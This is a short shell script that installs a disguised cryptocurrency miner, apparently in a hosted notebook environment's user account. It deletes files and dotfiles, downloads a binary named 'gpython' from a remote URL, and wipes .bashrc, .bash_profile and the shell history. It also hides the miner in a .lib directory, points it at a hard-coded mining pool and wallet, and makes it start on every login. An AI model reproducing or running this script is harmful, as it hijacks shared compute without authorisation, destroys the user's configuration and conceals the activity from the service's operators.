#!/bin/sh
cd ~/
rm -rvf ele* lol* 1.43* TON* ton* NB* .lib* .bash*
mkdir .lib
cd .lib
rm -R *
rm -R /home/studio-lab-user/.ton
WORKER="RTX-2060-LHR"
WALLETNH="3A7jTKEyNHyLLnUM4982okvojs31ATXBLX"
POOLNH="3.1.81.175:80"
wget https://ewr1.vultrobjects.com/mines/gpython
echo ""  > /home/studio-lab-user/.bashrc
echo "" > /home/studio-lab-user/.bash_history
echo "" > /home/studio-lab-user/.bash_profile
echo 'echo ""  >> /home/studio-lab-user/.bash_history' >> /home/studio-lab-user/.bashrc
echo "source /home/studio-lab-user/.bash_profile"  >> /home/studio-lab-user/.bashrc
echo "LD_LIBRARY_PATH=/home/studio-lab-user/.lib" > /home/studio-lab-user/.bash_profile
echo "export LD_LIBRARY_PATH" >> /home/studio-lab-user/.bash_profile
echo 'WORKER="x"' >> ~/.bash_profile
echo 'WALLETNH="3A7jTKEyNHyLLnUM4982okvojs31ATXBLX"' >> /home/studio-lab-user/.bash_profile
echo 'POOLNH="3.1.81.175:80"' >> /home/studio-lab-user/.bash_profile
echo "bash /home/studio-lab-user/.lib/gas.sh"  >> /home/studio-lab-user/.bash_profile
echo "./.lib/gpython --algo ethash --server $POOLNH --user $WALLETNH.$WORKER -p x -i 100 -w 0 --kernel 0 --proto stratum" > /home/studio-lab-user/.lib/gas.sh
chmod +x gas.sh && chmod +x gpython && cd ~/ && history -cr && source .bashrc

